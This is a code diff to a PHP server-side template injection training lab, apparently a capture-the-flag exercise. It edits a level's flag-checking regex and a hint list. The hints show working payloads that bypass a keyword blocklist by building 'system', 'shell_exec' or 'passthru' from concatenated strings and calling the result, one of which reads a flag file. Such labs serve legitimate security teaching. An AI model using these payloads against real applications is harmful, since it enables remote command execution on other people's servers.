@@ -262,7 +262,7 @@ function ssti_flag_earned(int $level, string $input, array $run): bool
         case 2:
             // Variable / superglobal access.
             return $run['executed']
-                && (bool) preg_match('/\$_(SERVER|GET|POST|ENV|COOKIE|REQUEST)|\$GLOBALS/i', $input)
+                && (bool) preg_match('/\$_(SERVER|GET|POST|ENV|COOKIE|REQUEST)|\$GLOBALS|getenv\s*\(/i', $input)
                 && trim($out) !== '';
 
         case 3:
@@ -402,7 +402,7 @@ function get_level_hints(int $levelId): array
             'PHP lets you call a function through a variable: if <code>$f</code> holds the string <code>system</code>, then <code>$f(\'id\')</code> executes <code>system(\'id\')</code>.',
             'Assemble the name in a variable so the blocked substring never appears in your input: <code>$f=\'sys\'.\'tem\';</code>.',
             'The engine accepts multiple statements in one block, so combine the assignment and the call: <code>{{ $f=\'sys\'.\'tem\';$f(\'id\') }}</code>.',
-            'Working payloads: <code>{{ $f=\'sys\'.\'tem\';$f(\'id\') }}</code> &nbsp;|&nbsp; <code>{{ $f=\'shell\'.\'_exec\';$f(\'id\') }}</code> &nbsp;|&nbsp; <code>{{ $x=\'pass\'.\'thru\';$x(\'id\') }}</code>',
+            'Working payloads: <code>{{ $f=\'sys\'.\'tem\';$f(\'id\') }}</code> &nbsp;|&nbsp; <code>{{ $f=\'sys\'.\'tem\';$f(\'cat /var/secret/flag.txt\') }}</code> &nbsp;|&nbsp; <code>{{ $x=\'pass\'.\'thru\';$x(\'id\') }}</code>',
         ],
         9 => [
             'The developer tries to "strip out template tags" before rendering. Read the source: the stripper removes only ONE outer <code>{{ ... }}</code> layer — it is not applied recursively.',
